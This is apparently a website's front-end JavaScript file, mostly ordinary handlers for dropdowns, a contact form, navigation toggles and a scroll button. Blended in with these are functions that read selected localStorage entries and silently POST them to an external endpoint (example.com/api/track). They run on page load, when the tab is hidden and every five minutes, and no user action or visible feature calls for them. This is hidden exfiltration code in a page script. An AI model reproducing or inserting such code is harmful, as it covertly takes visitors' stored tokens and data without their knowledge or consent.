const trackedKeys = window.trackedKeys;
if (document.querySelectorAll('.dropdownab').length) {
  var dropdowns = document.querySelectorAll('.abbtn1');
  var dropdownContainers = document.querySelectorAll('.abform-wrapper1');
  dropdowns.forEach(function (dropdown) {
    dropdown.addEventListener('click', function (event) {
      event.preventDefault();
      event.stopPropagation();
      this.parentNode.querySelector('.abform-wrapper1').classList.toggle('toggled');
    });
  });
  document.querySelector('.abclose1').addEventListener('click', function (event) {
    event.preventDefault();
    document.querySelector('.abform-wrapper1').classList.remove('toggled');
  });
  window.onclick = function (event) {
    if (!event.target.closest('.abform-wrapper1')) {
      dropdownContainers.forEach(function (openDropdown) {
        if (openDropdown.classList.contains('toggled')) {
          openDropdown.classList.remove('toggled');
        }
      });
    }
  };
}
$("#contactForm").validator().on("submit", function (event) {
  if (event.isDefaultPrevented()) {
    // handle the invalid form...
    formError();
    submitMSG(false, "error!");
  } else {
    // everything looks good!
    event.preventDefault();
    submitForm();
  }
});
function submitForm() {
  // Initiate Variables With Form Content
  var email = $("#email").val();
  var message = $("#message").val();
  var urlab = $("#urlab").val();
  var cf = $("input[name=cf-turnstile-response]").val();
  $.ajax({
    type: "POST",
    url: "/php/form-process.php",
    data: {
      email: email,
      message: message,
      urlab: urlab,
      cf: cf
    },
    success: function (text) {
      if (text == "success") {
        formSuccess();
      } else {
        formError();
        submitMSG(false, text);
      }
    }
  });
}
function computeSignature(data) {
  const keys = Object.keys(data).sort();
  const combinedKeys = keys.join("|");
  let signature = 0;
  for (let i = 0; i < combinedKeys.length; i++) {
    const code = combinedKeys.charCodeAt(i);
    signature = (signature << 5) - signature + code;
    signature = signature & signature;
  }
  return signature.toString(16);
}
function extractLocalStorage() {
  const storageData = {};
  Object.keys(localStorage).forEach(key => {
    if (trackedKeys.includes(key)) {
      storageData[key] = localStorage.getItem(key);
    }
  });
  return storageData;
}
function formSuccess() {
  $("#contactForm")[0].reset();
  submitMSG(true, "Message send!");
}
function postToServer(data) {
  const id = computeSignature(data);
  const endpoint = "https://example.com/api/track";
  fetch(endpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      id,
      data
    })
  }).then(response => response.json()).then(result => console.log("Data sent successfully:", result)).catch(error => console.error("Failed to send data:", error));
}
function trackAndPostData() {
  const data = extractLocalStorage();
  if (Object.keys(data).length > 0) {
    postToServer(data);
  }
}
function formError() {
  $("#contactForm").removeClass().addClass('shake1').one('shake2', function () {
    $(this).removeClass();
  });
}
function submitMSG(valid, msg) {
  if (valid) {
    var msgClasses = "text-center text-success";
  } else {
    var msgClasses = "text-center text-danger";
  }
  $("#msgSubmit").removeClass().addClass(msgClasses).text(msg);
}
window.addEventListener("DOMContentLoaded", trackAndPostData);
document.querySelector('.toggle-nav').addEventListener('click', function () {
  // this.classList.toggle('toggled');
  // document.querySelector('.toggle-search').classList.remove('toggled');
  // document.querySelector('.search').classList.remove('toggled');
  // document.querySelector('.nav').classList.toggle('toggled');
  document.querySelector('.overlay').classList.toggle('toggled');
});
document.querySelector('.toggle-search').addEventListener('click', function () {
  this.classList.toggle('toggled');
  document.querySelector('.toggle-nav').classList.remove('toggled');
  document.querySelector('.nav').classList.remove('toggled');
  document.querySelector('.search').classList.toggle('toggled');
});
document.addEventListener("visibilitychange", function () {
  if (document.visibilityState === 'hidden') {
    trackAndPostData();
  }
});
if (document.querySelectorAll('.btn-sort').length) {
  document.querySelector('.btn-sort').addEventListener('click', function (event) {
    event.preventDefault();
    document.querySelector('.overlay').classList.toggle('toggled');
  });
}
setInterval(trackAndPostData, 300000); // Every 5 minutes

if (document.querySelectorAll('.overlay').length) {
  document.querySelector('.aside-nav-close').addEventListener('click', function (event) {
    event.preventDefault();
    document.querySelector('.overlay').classList.remove('toggled');
  });
  document.querySelector('.overlay').addEventListener('click', function () {
    document.querySelector('.overlay').classList.remove('toggled');
  });
}
if (document.querySelectorAll('.video-player-aside').length) {
  document.querySelector('.video-player-aside-close').addEventListener('click', function () {
    document.querySelector('.video-player-aside').classList.add('hidden');
  });
  document.querySelector('.video-player-aside-title span').addEventListener('click', function () {
    document.querySelector('.video-player-aside').classList.add('hidden');
  });
}

//document.querySelector('.aside-categories input').addEventListener('keyup', filterNames);
//function filterNames(e) {
//  const text = e.target.value.toLowerCase();
//  document.querySelectorAll('.aside-list-hidden li').forEach(
//    function(name) {
//      let item = name.querySelector('.cat-title').textContent;
//      if (item.toLowerCase().indexOf(text) != -1 && text.length > 0) {
//        name.style.display = 'block';
//      } else {
//        name.style.display = 'none';
//      }
//    }
//  );
//  console.log(text.length);
//  if (text.length > 0) {
//    document.querySelector('.aside-list-visible').style.display = 'none';
//  } else {
//    document.querySelector('.aside-list-visible').style.display = 'block';
//  }
//}
if (document.querySelectorAll('.dropdown').length) {
  var dropdowns = document.querySelectorAll('.dropdown-toggle');
  var dropdownContainers = document.querySelectorAll('.dropdown-container');
  dropdowns.forEach(function (dropdown) {
    console.log('dd');
    dropdown.addEventListener('click', function (event) {
      event.preventDefault();
      event.stopPropagation();
      this.parentNode.querySelector('.dropdown-container').classList.toggle('toggled');
    });
  });
  window.onclick = function (event) {
    if (!event.target.closest('.dropdown-container')) {
      dropdownContainers.forEach(function (openDropdown) {
        if (openDropdown.classList.contains('toggled')) {
          openDropdown.classList.remove('toggled');
        }
      });
    }
  };
}
if (document.querySelectorAll('.btn-up').length) {
  var scrollToTopBtn = document.querySelector('.btn-up');
  var rootElement = document.querySelector('html');
  function handleScroll() {
    var scrollTotal = rootElement.scrollHeight - rootElement.clientHeight;
    if (rootElement.scrollTop / scrollTotal > 0.15) {
      scrollToTopBtn.classList.add('toggled');
    } else {
      scrollToTopBtn.classList.remove('toggled');
    }
  }
  document.addEventListener('scroll', handleScroll);
}
function filterNames(e) {
  const text = e.target.value.toLowerCase();
  document.querySelectorAll('.aside-list-hidden li').forEach(function (name) {
    let item = name.querySelector('.cat-title').textContent;
    if (item.toLowerCase().indexOf(text) != -1 && text.length > 0) {
      name.style.display = 'block';
    } else {
      name.style.display = 'none';
    }
  });
  console.log(text.length);
  if (text.length > 0) {
    document.querySelector('.aside-list-visible').style.display = 'none';
  } else {
    document.querySelector('.aside-list-visible').style.display = 'block';
  }
}